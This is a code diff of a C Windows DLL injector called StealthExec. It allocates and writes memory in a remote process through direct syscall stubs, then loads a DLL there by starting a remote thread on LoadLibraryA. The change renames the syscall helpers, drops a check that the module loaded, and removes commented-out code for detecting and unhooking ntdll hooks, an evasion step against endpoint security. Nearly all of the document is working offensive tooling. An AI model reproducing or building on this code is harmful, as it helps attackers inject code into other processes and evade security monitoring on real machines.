@@ -27,22 +27,6 @@ FARPROC ResolveFn(LPCSTR mod, LPCSTR fn) {
     return NULL;
 }
 
-// Resolve Remote Module Handle
-HMODULE FindModInProc(HANDLE hProc, const char* modName) {
-    HMODULE hMods[512];
-    DWORD needed;
-    if (EnumProcessModules(hProc, hMods, sizeof(hMods), &needed)) {
-        for (int i = 0; i < (needed / sizeof(HMODULE)); i++) {
-            char modPath[MAX_PATH];
-            if (GetModuleFileNameExA(hProc, hMods[i], modPath, sizeof(modPath))) {
-                const char* baseName = strrchr(modPath, '\\') ? strrchr(modPath, '\\') + 1 : modPath;
-                if (_stricmp(baseName, modName) == 0) return hMods[i];
-            }
-        }
-    }
-    return NULL;
-}
-
 // Core Injection Logic
 void StealthExec(HANDLE hProc, HANDLE hThread, const char* dllEnc) {
     PVOID memLoc = NULL;
@@ -53,15 +37,14 @@ void StealthExec(HANDLE hProc, HANDLE hThread, const char* dllEnc) {
 
     // Resolve Required Functions
     FARPROC pLLoad = ResolveFn("kernel32.dll", "LoadLibraryA");
-    FARPROC pGProc = ResolveFn("kernel32.dll", "GetProcAddress");
 
-    if (!pLLoad || !pGProc) {
+    if (!pLLoad) {
         printf("[!] Unable to resolve core functions.\n");
         return;
     }
 
-    SetSystemCall(GetSyscallNumber("NtAllocateVirtualMemory"));
-    status = custAVM(hProc, &memLoc, 0, &sz, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
+    SetSyid(GetSyid("NtAllocateVirtualMemory"));
+    status = CustAVM(hProc, &memLoc, 0, &sz, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
     if (status != 0) {
         printf("[!] NtAllocateVirtualMemory failed! Status: 0x%lX\n", status);
     } else {
@@ -73,9 +56,9 @@ void StealthExec(HANDLE hProc, HANDLE hThread, const char* dllEnc) {
         return;
     }
 
-    SetSystemCall(GetSyscallNumber("NtWriteVirtualMemory"));
+    SetSyid(GetSyid("NtWriteVirtualMemory"));
     // Write Encrypted DLL Path to Remote Process
-    status = custWVM(hProc, memLoc, (PVOID)dllEnc, (ULONG)sz, NULL);
+    status = CustWVM(hProc, memLoc, (PVOID)dllEnc, (ULONG)sz, NULL);
     if (status != 0) {
         printf("[!] Memory write failed (Err: 0x%lX).\n", status);
         return;
@@ -90,15 +73,7 @@ void StealthExec(HANDLE hProc, HANDLE hThread, const char* dllEnc) {
     WaitForSingleObject(hThreadRemote, INFINITE);
     CloseHandle(hThreadRemote);
 
-    // Verify if DLL is Loaded
-    Sleep(500);
-    HMODULE hRemMod = FindModInProc(hProc, strrchr(dllEnc, '\\') + 1);
-    if (!hRemMod) {
-        printf("[!] Module not found in remote process.\n");
-        return;
-    }
-
-    printf("[*] Successfully injected module @ %p\n", hRemMod);
+    printf("[*] Successfully injected module\n");
 }
 
 // Entry Function
@@ -113,10 +88,6 @@ int main(int argc, char* argv[]) {
         LaunchCalc();
         return 0;
     }
-    // IsNtDllHooked();
-    // // if (IsNtDllHooked()) {
-    // //     UnhookNtdll();
-    // // }
 
     const char* dllPath = argv[1];
 
